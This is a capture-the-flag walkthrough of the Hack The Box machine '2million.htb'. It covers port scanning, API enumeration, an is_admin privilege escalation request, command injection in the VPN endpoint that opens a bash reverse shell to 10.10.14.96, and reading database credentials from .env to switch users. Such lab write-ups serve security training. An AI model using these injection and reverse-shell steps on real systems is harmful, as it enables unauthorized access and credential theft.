
1 - RECON

nmap -A -T4 10.10.11.221     
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-11 01:02 -03
Nmap scan report for 10.10.11.221
Host is up (0.14s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx
|_http-title: Did not follow redirect to http://2million.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

sudo nmap -sC -sV  10.10.11.221
[sudo] password for r_deckard: 
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-11 01:27 -03
Nmap scan report for 2million.htb (10.10.11.221)
Host is up (0.17s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx
|_http-title: Hack The Box :: Penetration Testing Labs
|_http-trane-info: Problem with XML parsing of /evox/about
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

2 - WEB RECON

200      GET       80l      232w     3704c http://2million.htb/login
200      GET       94l      293w     4527c http://2million.htb/register
401      GET        0l        0w        0c http://2million.htb/api
401      GET        0l        0w        0c http://2million.htb/api/v1
302      GET        0l        0w        0c http://2million.htb/logout => http://2million.htb/
200      GET     1242l     3326w    64952c http://2million.htb/
302      GET        0l        0w        0c http://2million.htb/home => http://2million.htb/
200      GET       46l      152w     1674c http://2million.htb/404


## WEB FINDINGS

### IN URLS FIND JS FILES TO VALIDATE INVITE

http://2million.htb/register
http://2million.htb/js/inviteapi.min.js

makeInviteCode();

Object { 0: 200, success: 1, data: {…}, hint: "Data is encrypted ... We should probbably check the encryption type in order to decrypt it..." }

data: Object { data: "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr", enctype: "ROT13" }

data: "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr"

enctype: "ROT13"

### DECRYPT ROT13

In order to generate the invite code, make a POST request to /api/v1/invite/generate


### SEND REQUEST WITH CURL

curl -X POST http://2million.htb/api/v1/invite/generate

{"0":200,"success":1,"data":{"code":"VlZOUzctUjNUQVotS1pUQUEtWUM4Ukc=","format":"encoded"}}

### DECODED INVITE CODE

echo VlZOUzctUjNUQVotS1pUQUEtWUM4Ukc= | base64 -d
VVNS7-R3TAZ-KZTAA-YC8RG

### REGISTER/LOGIN

fatboy

fatboysec@mail.com

123456789

### IN USER ACCOUNT HAVE PAGE FOR GIVE ACCESS TO VPN

http://2million.htb/home/access

download file: http://2million.htb/api/v1/user/vpn/generate

(/api/v1/)

### ENUMERATE API

http://2million.htb/api/v1

{"v1":{"user":{
"GET":{
"\/api\/v1":"Route List",
"\/api\/v1\/invite\/how\/to\/generate":"Instructions on invite code generation",
"\/api\/v1\/invite\/generate":"Generate invite code",
"\/api\/v1\/invite\/verify":"Verify invite code",
"\/api\/v1\/user\/auth":"Check if user is authenticated",
"\/api\/v1\/user\/vpn\/generate":"Generate a new VPN configuration",
"\/api\/v1\/user\/vpn\/regenerate":"Regenerate VPN configuration",
"\/api\/v1\/user\/vpn\/download":"Download OVPN file"},
"POST":{
"\/api\/v1\/user\/register":"Register a new user",
"\/api\/v1\/user\/login":"Login with existing user"}},
"admin":{"GET":{
"\/api\/v1\/admin\/auth":"Check if user is admin"},
"POST":{"\/api\/v1\/admin\/vpn\/generate":"Generate VPN for specific user"},
"PUT":{"\/api\/v1\/admin\/settings\/update":"Update user settings"}}}}


### ENDPOINT MORE INTERESTING

http://2million.htb/api/v1/admin/settings/update

POST /api/v1/admin/settings/update
{
"email": "fatboysec@mail.com",
"is_admin": 1
}

POST /api/v1/admin/vpn/generate (return file for vpn)
{
"username": "fatboy"
}

### EXPLORATION ENDPOINT /api/v1/admin/vpn/generate


POST /api/v1/admin/vpn/generate
{
"username": "fatboy; id;"
}

### HAVE SHELL 

POST /api/v1/admin/vpn/generate
{
"username": "fatboy; bash -c 'sh -i >& /dev/tcp/10.10.14.96/1234 0>&1' ;"
}

### ON MACHINE

www-data@2million:~/html$ ls -lah 

drwxr-xr-x 10 root root 4.0K Jun 11 19:20 .
drwxr-xr-x  3 root root 4.0K Jun 11 16:17 ..
-rw-r--r--  1 root root   87 Jun  2 18:56 .env
-rw-r--r--  1 root root 1.3K Jun  2 16:15 Database.php
-rw-r--r--  1 root root 2.8K Jun  2 16:15 Router.php
drwxr-xr-x  5 root root 4.0K Jun 11 19:20 VPN
drwxr-xr-x  2 root root 4.0K Jun  6 10:22 assets
drwxr-xr-x  2 root root 4.0K Jun  6 10:22 controllers
drwxr-xr-x  5 root root 4.0K Jun  6 10:22 css
drwxr-xr-x  2 root root 4.0K Jun  6 10:22 fonts
drwxr-xr-x  2 root root 4.0K Jun  6 10:22 images
-rw-r--r--  1 root root 2.7K Jun  2 18:57 index.php
drwxr-xr-x  3 root root 4.0K Jun  6 10:22 js
drwxr-xr-x  2 root root 4.0K Jun  6 10:22 views

### FIND .env FILE

www-data@2million:~/html$ cat .env

cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123


### TRY PASS TO ADMIN

www-data@2million:~/html$ su admin
su admin
Password: SuperDuperPass123

To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.


### HAVE PRIV ESC

admin@2million:~$ 
/home/admin

admin@2million:~$ cat user.txt
cat user.txt

95d3a4005e3aae479bb651ced88a1533 

o/